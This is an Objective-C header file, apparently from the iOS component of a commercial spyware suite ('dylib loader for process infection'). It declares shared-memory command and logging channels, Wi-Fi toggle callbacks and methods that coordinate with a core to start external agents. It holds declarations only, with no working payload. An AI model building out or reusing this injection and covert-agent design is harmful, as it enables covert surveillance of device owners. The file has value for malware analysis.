/*
 * RCSiOS - dylib loader for process infection
 *  pon pon 
 *
 *
 * Created on 22/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Foundation/Foundation.h>

#ifndef __RCSILoader_h__
#define __RCSILoader_h__

#import "RCSICommon.h"
#import "RCSISharedMemory.h"


extern RCSISharedMemory *mSharedMemoryCommand;
extern RCSISharedMemory *mSharedMemoryLogging;

static void TurnWifiOn(CFNotificationCenterRef center, 
                       void *observer,
                       CFStringRef name, 
                       const void *object,
                       CFDictionaryRef userInfo);
static void TurnWifiOff(CFNotificationCenterRef center, 
                        void *observer,
                        CFStringRef name, 
                        const void *object,
                        CFDictionaryRef userInfo);


@interface RCSILoader : NSObject
{
  BOOL mMainThreadRunning;
}

//
// @author
//  revenge
// @abstract
//  This function will communicatore within the core through shared memory
//
- (void)communicateWithCore;

//
// @author
//  revenge
// @abstract
//  This function will be responsible of communicating with our Core in order
//  to read the passed configuration and start all the required external agents
//
- (void)startCoreCommunicator;

@end

#endif